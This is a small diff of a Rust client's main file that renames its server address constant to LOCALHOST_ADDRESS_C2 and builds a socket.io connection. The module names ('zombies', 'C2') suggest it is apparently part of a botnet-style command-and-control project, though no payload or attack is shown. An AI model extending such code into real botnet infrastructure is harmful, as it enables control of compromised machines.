@@ -2,7 +2,7 @@ mod constants;
 mod utils;
 mod zombies;
 
-use constants::localhost::{LOCALHOST_ADDRESS, LOCALHOST_PORT};
+use constants::localhost::{LOCALHOST_ADDRESS_C2, LOCALHOST_PORT};
 use futures_util::FutureExt;
 use rust_socketio::{
     asynchronous::{Client, ClientBuilder},
@@ -19,7 +19,7 @@ async fn main() {
         Err(e) => println!("Error creating zombie service:\n{}", e),
     }
 
-    let url: String = format!("http://{}:{}", LOCALHOST_ADDRESS, LOCALHOST_PORT);
+    let url: String = format!("http://{}:{}", LOCALHOST_ADDRESS_C2, LOCALHOST_PORT);
 
     ClientBuilder::new(url)
         .namespace("/")
